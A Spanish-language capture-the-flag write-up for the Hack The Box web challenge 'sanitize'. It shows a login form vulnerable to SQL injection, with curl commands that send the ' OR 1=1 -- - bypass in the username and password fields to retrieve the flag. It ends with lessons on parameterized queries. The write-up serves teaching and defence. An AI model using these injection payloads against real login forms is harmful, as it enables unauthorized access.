---
title: "sanitize"
description: "Writeup de sanitize - Hack The Box - Web 200pts. Login con SQL injection clásico en ambos parámetros (username y password); un simple bypass OR 1=1 devuelve la flag en la respuesta HTML."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - sqli
  - sql-injection
  - login-bypass
  - easy
---

# sanitize

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Un formulario de login clásico que construye una consulta SQL concatenando directamente los valores del usuario sin ningún tipo de sanitización. Ambos parámetros — `username` y `password` — son inyectables. El bypass es sencillo: una condición que siempre es verdadera (`OR 1=1`) omite la verificación de credenciales y devuelve la flag en el cuerpo de la respuesta.

---

## Reconocimiento

La aplicación tiene un login en `POST /` con `Content-Type: application/x-www-form-urlencoded`. Una prueba básica con credenciales inválidas devuelve una página de error de login. Probando con comilla simple:

```bash
curl -s -X POST "http://$HOST/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username='&password=test"
```

Si devuelve un error SQL o se comporta de forma diferente al error de login normal, confirma que el campo es inyectable.

---

## Payload de SQL Injection

La consulta SQL vulnerable tiene una forma similar a:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

Al inyectar `' OR 1=1 -- -`, la consulta se convierte en:

```sql
SELECT * FROM users WHERE username='' OR 1=1 -- -' AND password='...'
```

La condición `1=1` siempre es verdadera, y el comentario `-- -` ignora el resto de la query (incluyendo la verificación de la contraseña). El servidor autentica al primer usuario de la tabla y devuelve la flag.

```bash
curl -X POST "http://$HOST/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "username='+or+1%3D1+--+-&password='+or+1%3D1+--+-" | grep "HTB"
```

```text
<p class="slogan"><span>HTB{FLAG}</span></p>
```

La flag aparece en el cuerpo de la respuesta HTML.

---

## Verificación de los dos parámetros inyectables

Es posible inyectar solo en `username` (con un password válido o falso) y también obtendremos acceso, pero ambos campos son vulnerables porque la query no filtra ninguno:

```bash
# Solo username inyectable
curl -X POST "http://$HOST/" \
  -d "username='+OR+1=1+--+-&password=anything"
# También funciona
```

---

## Cadena de Ataque

```text
1. POST / con usuario/pass inválidos → formulario de login
       ↓
2. Probar comilla simple → comportamiento distinto al error normal → SQLi
       ↓
3. Inyectar ' OR 1=1 -- - en username y password
       ↓
4. Query SQL: WHERE username='' OR 1=1 -- -' → siempre verdadera
       ↓
5. Servidor autentica → flag en la respuesta HTML
```

---

## Lecciones Aprendidas

- **Prepared statements / parametrized queries**: es la única forma correcta de evitar SQL injection. En lugar de concatenar el input, usar `?` o `:param` y dejar que el driver prepare la consulta con los valores separados.
- **No confiar en validación del cliente**: muchos formularios validan el input en JavaScript, pero si no hay validación del lado del servidor, la inyección es trivial desde la terminal.
- **Ambos parámetros de login son vectores**: es común solo pensar en el campo de usuario como vector de SQLi, pero el campo de contraseña tiene exactamente las mismas consecuencias si también se concatena directamente.
- **Filtros de caracteres no son suficientes**: hacer un `replace("'", "''")` o escapar solo las comillas simples puede ser insuficiente; la única solución robusta son las queries parametrizadas.

---

## Referencias

- [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger — SQL injection bypass login](https://portswigger.net/web-security/sql-injection)
- [HackTricks — SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
